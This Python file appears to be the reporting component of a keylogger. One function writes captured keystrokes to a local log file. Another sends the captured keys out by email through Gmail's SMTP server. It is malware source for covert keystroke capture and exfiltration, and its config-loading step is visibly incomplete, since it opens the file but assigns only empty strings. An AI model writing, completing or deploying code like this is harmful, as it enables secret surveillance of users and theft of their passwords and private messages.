from typing import List
from os.path import exists
from pynput.keyboard import Key

import smtplib, ssl

def report_to_file(keys: List, file_name='log.txt'):
    """Reports keys to local file."""
    write_mode = 'w'

    # Append to log.txt else create one
    if exists('log.txt'):
        write_mode = 'a'

    with open(file_name, write_mode) as f_obj:
        for key in keys:

            if key == Key.space:
                f_obj.write(" ")

            elif key == Key.enter:
                # Append new line to log file, when ENTER is pressed.
                f_obj.write("\n")

            elif key in (Key.shift, Key.shift_r, Key.shift_l):
                pass

            else:
                k = str(key).replace("'", "")
                f_obj.write(k)


def report_with_email(keys: List, config_file: str) -> None:
    """Use email as the reporting method."""
    # Create message
    message = f"""
              Subject: log
              {keys}
              """

    # Read config data from file
    with open(config_file, "r") as cnfg_file:
        sender_email = ''
        receiver_email = ''
        password = ''
        port = ''

    # Establish connection and send mail
    context = ssl.create_default_context()
    with smtplib.SMTP_SSL("smtp.gmail.com", port, context=context) as server:
        server.login(sender_email, password)

        server.sendmail(sender_email, receiver_email, message)







